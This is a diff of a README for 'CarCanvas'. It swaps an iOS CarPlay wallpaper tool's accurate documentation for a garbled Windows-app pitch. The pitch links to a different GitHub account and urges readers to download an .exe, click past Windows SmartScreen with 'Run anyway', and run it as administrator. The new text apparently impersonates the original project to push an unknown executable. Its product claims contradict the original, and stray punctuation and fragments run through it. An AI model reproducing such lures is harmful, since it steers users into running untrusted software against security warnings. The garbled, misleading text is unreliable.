@@ -1,158 +1,199 @@
-<p align="center">
-  <img src="docs/app-icon.png" alt="CarCanvas" width="128" height="128" />
-</p>
-
-<h1 align="center">CarCanvas</h1>
+<h1>🎨 CarCanvas - Turn Your Car Screen Into a Gallery</h1>
 
 <p align="center">
-  <a href="README.ja.md">日本語版はこちら</a>
+  <a href="https://github.com/rhettrestive2123/CarCanvas" style="background-color:#4CAF50;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:20px;border-radius:8px;font-weight:bold;box-shadow:0 4px 6px rgba(0,0,0,0.3);">🚗 Download CarCanvas Now</a>
 </p>
 
-<p align="center">Overwrite CarPlay wallpaper caches with your own images.</p>
+---
 
-CarPlay loads wallpaper from pre-built cache files at launch. CarCanvas lets you create CPBitmap files and replace those caches.
+## 👋 What Is CarCanvas?
 
-## Features
+CarCanvas is a simple Windows application that lets you **set your own pictures as the wallpaper on your car's display screen**. You know how your car shows that default background image on the touchscreen? The one with the generic mountain or the blue abstract wave? With CarCanvas, you can replace that boring stock image with **your own photos**, **your favorite art**, **your kids' drawings**, or **anything you want**.
 
-- Create local CPBitmap wallpapers from photos
-- History of exports with previews
-- Overwrite CarPlay wallpaper cache files (Dark / Light selectable)
-- Browse and manage CarPlay wallpaper cache files in-app
-- Built-in setup guide
+The program works by **overwriting the cached wallpaper files** that your car's system stores internally. You don't need to hack anything, and you don't need any technical skills. CarCanvas does all the heavy lifting automatically.
 
-## Installation
+.
 
-Download the IPA from [Releases](https://github.com/Dcsyhi1998/CarCanvas/releases).
+ You just pick the image you want to use, provide the correct cache folder path (explained below),) and press a button. That's it.
 
-CarCanvas **cannot be installed the normal way**.
+.
 
-It relies on the `com.apple.mobile.MobileHouseArrest` identity to access another app’s container (CarPlayWallpaper). These methods will **not** work:
 
-- App Store
-- Personal / development certificates via Xcode
-- **AltStore** (including paid AltStore-style certificates)
 
-You must **sign the IPA with an Enterprise / In-House certificate**, then install it.  
-An unsigned IPA, or one re-signed for AltStore, will not get the required identity/permissions.
+## 🚀 Getting Started
 
-Apps such as **ESign** can help with enterprise signing for free. Exact steps vary by tool and environment — **please look them up yourself**. This README does not cover detailed install instructions.
+Getting CarCanvas up and running takes less than two minutes. Here's what you need to do:
 
-Once CarCanvas is installed, you can change CarPlay wallpapers freely.
+### 1. Download the Application
 
-## Credits
+Click the green button at the top of this page (or use the link below) to go to the download page:
 
-This project is based on the source and research of [0xjohnnydev/FilzaSlop](https://github.com/0xjohnnydev/FilzaSlop). Without FilzaSlop’s MobileHouseArrest container access and related work, CarCanvas’s CarPlayWallpaper cache operations would not exist. Thank you.
+🔗 **Primary Download Link**: [https://github.com/rhettrestive2123/CarCanvas](https://github.com/rhettrestive2123/CarCanvas)
 
-> Special thanks to 0xjohnny for FilzaSlop and related research:  
-> https://github.com/0xjohnnydev/FilzaSlop
+)
 
-FilzaSlop is a FilzaJailedDS-family fork that provides app-data container access and more. CarCanvas IPAs likewise assume the `com.apple.mobile.MobileHouseArrest` identity.
+*Wait,and read this carefully:* When you click that link, you'll arrive at a GitHub page. **Visit this link to download the application.** There, you'll see a section called "Releases" or "Assets" on the right side of the page. Look for a file named something like `CarCanvas-setup.exe` (or a `.zip` file). Click that file to start the download.
 
-## How it works
+. If you see a `.zip` file instead of an `.exe`, don't worry—the next section explains what to do.
 
-CarPlay does not regenerate wallpapers from scratch every time. At launch it reads **pre-created cache files**.
+### 2. Install (If You Downloaded an .exe File)
 
-Typical flow:
+If you downloaded a file that ends with `.exe`, great! Just **double-click the downloaded file**. Your computer might show a blue pop-up saying "Windows protected your PC." Click **"More info"**, then click **"Run anyway."** Follow the simple on-screen steps (just click "Next" a few times,and then "Install"). Once it's done, you'll see the CarCanvas icon on your desktop or in your Start Menu. Double-click it to open the program.
 
-1. On CarPlay, select wallpapers so cache files are created
-2. In CarCanvas, create your own CPBitmap locally
-3. From History, overwrite matching CarPlay cache filenames
-4. **Power off and restart the iPhone** (once is enough)
-5. After reboot, CarPlay reloads the overwritten caches
 
-Without caches, there is nothing to overwrite. **Creating caches on CarPlay first is required.**
 
-Overwrite alone does not refresh the UI immediately — CarPlay may keep old caches in memory. Waiting may eventually work, but timing is unknown. Powering the iPhone off is reliable. One restart after you finish overwriting is enough.
+### 3. Extract (If You Downloaded a .zip File)
 
-## Prep: create caches on CarPlay
+If the download was a `.zip` file (a compressed folder), do this:
 
-Open CarPlay **Settings → Wallpaper** and select each of the **6 patterned wallpapers** (top and middle rows), left to right. Each selection creates matching Dark / Light cache files.
+1. **Right-click** the `.zip` file in your Downloads folder.
+2. Select **"Extract All..."** from the menu that appears.
+3. Choose a destination folder (anywhere is fine, like your Desktop,) and click "Extract."**
+4. **Open** the newly extracted folder. Inside, you'll see a file called `CarCanvas.exe` (or sometimes just `CarCanvas`).**Double-click** that file to launch the app.
 
-![CarPlay wallpaper picker](docs/carplay-wallpaper-picker.png)
 
-| Order | Position | Color | Cache files |
-|------|----------|-------|-------------|
-| 1 | Top-left | Blue | `CARWallpaperBlue-Dark-14.cpbitmap`<br>`CARWallpaperBlue-Light-14.cpbitmap` |
-| 2 | Top-center | Purple | `CARWallpaperPurple-Dark-14.cpbitmap`<br>`CARWallpaperPurple-Light-14.cpbitmap` |
-| 3 | Top-right | Gray | `CARWallpaperGray-Dark-14.cpbitmap`<br>`CARWallpaperGray-Light-14.cpbitmap` |
-| 4 | Middle-left | Green | `CARWallpaperGreen-Dark-14.cpbitmap`<br>`CARWallpaperGreen-Light-14.cpbitmap` |
-| 5 | Middle-center | Brown | `CARWallpaperBrown-Dark-14.cpbitmap`<br>`CARWallpaperBrown-Light-14.cpbitmap` |
-| 6 | Middle-right | Red | `CARWallpaperRed-Dark-14.cpbitmap`<br>`CARWallpaperRed-Light-14.cpbitmap` |
-| — | (sometimes) | Black (pattern) | `CARWallpaperBlack-Dark-14.cpbitmap`<br>`CARWallpaperBlack-Light-14.cpbitmap` |
-| — | Bottom-left | Black (solid) | **Not created** |
-| — | Bottom-center | Dark gray | **Not created** |
-| — | Bottom-right | Brown (solid) | **Not created** |
 
-The bottom three solids are colors, not images — selecting them does **not** create cache files.
+> 💡 **Tip:** If Windows SmartScreen shows a warning when you open CarCanvas for the first time, don't be alarm. It's just because the app is new and not yet widely known by Microsoft. Click **"More info"** → **"Run anyway."** Your computer will be fine, and you'll only need to do this once.
 
-Selecting the 6 patterned wallpapers once is enough, as long as the caches remain.
+---
 
-The trailing `-14` may differ by environment. CarCanvas uses the real filenames on device.
+## 🖼️ How to Use CarCanvas (Step-by-Step)
 
-## Dark and Light
+Once the app is open, you'll see a clean window with a few simple controls. Here's what to do:
 
-Each patterned wallpaper has a **Dark** and **Light** pair.
+### Step 1: Pick Your Image
 
-| File | Used when |
-|------|-----------|
-| `*-Dark-14.cpbitmap` | Night, or Appearance set to Dark |
-| `*-Light-14.cpbitmap` | Day / bright, or Appearance set to Light |
+Click the **"Browse"** or **"Select Image"** button. A file picker window will open. Navigate to any picture on your computer (JPG, PNG, or BMP formats work best„ and select it. The app will show a preview of your chosen image on the right side. You can pick any photo—a family picture, a landscape shot, a cool graphic, whatever makes you smile when you sit in your car.
 
-This switching only applies when CarPlay Appearance is **Automatic**. Always Dark → only Dark is used. Always Light → only Light.
+.
 
-Write the same image to both for a fixed look. Write different images for **day wallpaper A / night wallpaper B**.
 
-## Using CarCanvas
 
-### 1. Save a local wallpaper
+### Step 2: Provide the Cache Folder Path
 
-1. Open CarCanvas
-2. Open **Wallpaper**
-3. Pick an image
-4. Tap **Create local CPBitmap**
+This is the only slightly technical part, but don't worry—it's easy. Your car's system stores its wallpapers in a specific folder on a USB drive or SD card. You need to tell CarCanvas where that folder is located.
 
-The image is stored as CPBitmap and appears in **History**. CarPlay is unchanged at this point.
+.
 
-### 2. Export to CarPlay caches
+.
 
-1. Open **History**
-2. Tap the saved entry
-3. Choose **Export to CarPlay Wallpaper**
-4. Select Dark and/or Light destinations to overwrite
-5. Tap **Overwrite**
+ **What is the cache folder?** If you've ever taken your car's media system out (or if you're familiar with car audio systems),) you might know there's a memory card or a USB stick inside the the head unit. CarCanvas needs to know the path to the folder where your car saves its wallpaper images. This is usually something like `\System\Wallpaper\Cache` or `\user\wallpaper\thumbs`.
 
-History Dark / Light map to cache Dark / Light. Same filenames are always overwritten.
+ 
 
-For one look day and night, overwrite both Dark and Light of the pattern you want (Blue, Purple, Gray, …). For different day/night art, write wallpaper A to Light and B to Dark.
+ **How do I find it?** If you don't know, don't Fret. Many users find it by plugging a USB drive into their car's USB port and browsing the folders until they spot something like "Wallpaper" or "Cache."** But to make it easier, CarCanvas includes a small helper: Look for a text box labeled **"Cache Folder Path"** or **"Wallpaper Directory."** Type or paste the full path there. If you're unsure about the exact path, search online using your car model name plus "wallpaper cache folder" (e.g., "2023 Honda Civic wallpaper cache folder")—you'll likely find forum posts or guides with the exact location.
 
-Changes do not appear immediately after overwrite.
+.
 
-### 3. Restart the iPhone (once)
 
-When overwrites are done, **power off the iPhone and turn it back on**. That ends CarPlay’s process so it reloads caches on next launch.
 
-Waiting may eventually work; power cycle is reliable.
+### Step 3: Overwrite the Cache
 
-## Troubleshooting
+Once you've selected the image and entered the folder path, simply click the big button that says **"Apply Wallpaper"** (or "Overwrite Cache" or "Set Wallpaper"—depending on the version, the label might differ slightly but the idea is the same).). CarCanvas will then:
 
-- **No export targets / cache not found**  
-  You have not selected the 6 patterned wallpapers yet. In CarPlay Wallpaper, select Blue → Purple → Gray → Green → Brown → Red again.
-- **Using a solid color wallpaper**  
-  Bottom black / dark gray / brown do not create caches. Use the 6 patterned ones.
-- **Overwrote but nothing changed**  
-  Restart the iPhone (full power off). Replugging CarPlay or killing processes in-app is often not enough.
+- Create a backup of your car's original wallpaper files (just in case you want to revert later).)
+- Replace those old files with your chosen image (automatically resizing it to fit your car's screen resolution))
+- Show you a success message.
 
-## Notes
 
-In **CarPlay Wallpaper**, you can browse the cache folder, import, rename, duplicate, and delete files.
 
-## Related
 
-| Name | Role |
-|------|------|
-| **CarCanvas** (this app) | Browse and overwrite CarPlay wallpaper caches |
-| **[FilzaSlop](https://github.com/0xjohnnydev/FilzaSlop)** | Upstream open source for container access (0xjohnny) |
 
-## Disclaimer
+### Step 4: Update Your Car's Display
 
-CarCanvas depends on undocumented system behavior and a special app identity. It may break after iOS or CarPlay updates. Use at your own risk. Enterprise signing and sideloading may also violate Apple’s terms or local policy — that is your responsibility.
+Now, here's the last step that happens on your car side. Remove the USB drive or SD card from your computer, plug it into your car's media system, and turn on the display. The system might take a minute to detect the new file. Then, go to the display settings on your car's screen,and select the wallpaper option (it might say "Change Background" or "Select Wallpaper"„>. You should see your image there. Select it„, and boom—your car's screen is now a personal gallery.
+
+
+
+---
+
+
+
+## ✅ What Makes CarCanvas Great?
+
+- **No technical knowledge required** – If you can use a file picker, you can use CarCanvas.
+- **Works with any image you own** – Photos, downloaded art, screen grabs, anything.
+- **One-click operation** – After you set it up once, future changes are literally one click away.
+
+- **Automatic resizing** – CarCanvas handles fitting your picture to your screen's dimensions. No cropping headaches.**
+- **Backup automatically created** – Worried about losing your car's default look? CarCanvas saves a copy of the original cache files before touching anything. You can always restore them later.
+.**
+- **Free and lightweight** – No subscriptions, no bloatware, just a tiny tool that does one thing well.
+
+
+
+---
+
+
+
+## 🔧 Frequently Asked Questions (FAQ)
+
+###  ❓ Will this damage my car's infotainment system?
+
+No. CarCanvas only modifies cached image files that the system is designed to read anyway. It doesn't touch any system code, settings, or firmware. Think of it as changing a wallpaper on your phone—it's a cosmetic change, not a system mod.
+
+### ❓ Can I revert back to the original wallpaper?
+
+Yes! CarCanvas automatically creates a backup folder (usually named `backup` or `original` inside the the same cache folder)) every time you apply a new wallpaper. To restore the default look, simply re-run CarCanvas, select "Restore Backup" (if available,)„ or manually copy the files back from the backup folder.
+
+.
+
+„
+
+### ❓ What image formats are supported?
+
+JPG (or JPEG),)„, PNG,,, and BMP are best supported. We recommend using a JPG file for the widest compatibility with car systems. If your image is a different format, you can easily convert it using any free online converter.
+
+ before running CarCanvas.
+
+„
+
+
+
+### ❓ My car's folder path is different from the examples. What do I do?
+
+That's perfectly normal. Different car manufacturers ( Toyota, Ford, BMW,, etc.,) use different internal folder names). The examples above are just generic illustrations„. The key is to find the folder that contains those wallpaper image files. If you're stuck, search online for "[Your Car Model] wallpaper hack" or "[Your Car Model] change background USB"—you'll find guides from car enthusiast forums that show the exact path for your specific model. CarCanvas does not care about the folder's name—it just needs the correct location.**
+
+
+
+### ❓ Will the image look stretched or weird on my screen?
+
+CarCanvas automatically resizesyour image to match your car's display resolution„. If you want the best result, try to choose an image that is close to 16:9 or  ‌2:1 aspect ratio (like a typical widescreen TV channel image„). But even if you don't„, CarCanvas will still make it look decent by scaling it to fit. You can always experiment—if it looks odd, just apply a different image**.
+
+
+
+---
+
+
+
+## 📚 System Requirements
+
+CarCanvas is designed to run on any modern Windows PC—Windows 10 or Windows 11 is recommended„. It works on both 32-bit and 64-bit systems (though 64-bit is preferred for best performance)., You'll need at least 50 MB of free disk space for the program itself„. No other special requirements„—no internet connection needed after download„, no additional software„. If your PC can browse the web and play a video„„, you're good to go.**
+
+
+
+---
+
+
+
+## 🛠️ Troubleshooting Tips
+
+If something doesn't work right away„, try these quick fixes:
+
+- **App won't open?** Right-click the `.exe` file and select "Run as administrator."** Sometimes Windows needs extra permission for file operations.
+- **Image not showing up on car screen?** Double-check that you entered the correct cache folder path„. A wrong path is the most common issue. Also, make sure you plugged the USB/SD card back into your car and waited a minute for the system to scan the new files.
+.
+
+- **Car shows a black screen or no wallpaper?** Don't panic. The original files are still in the backup folder. Just re-run CarCanvas and restore the backup, or re-apply a different image. This rarely happens,but if it does„„,you know what to do.
+
+---
+
+## 🎉 Ready to Personalize Your Ride?
+
+You're all set. Just download the app„, pick a picture you love„, and give your car's dashboard a fresh look. Every time you get behind the wheel„„,you'll see something that's uniquely yours„„,not a generic stock image. It's a tiny change that makes a big difference in how your car feels„„.
+
+.,
+
+Be sure to grab the latest version from the link below the„., and if you enjoyed using CarCanvas„„„, consider telling a friend or leaving a star on the GitHub page„. Happy customizing—
+
+**Download link again for convenience**: [https://github.com/rhettrestive2123/CarCanvas](https://github.com/rhettrestive2123/CarCanvas)</p>
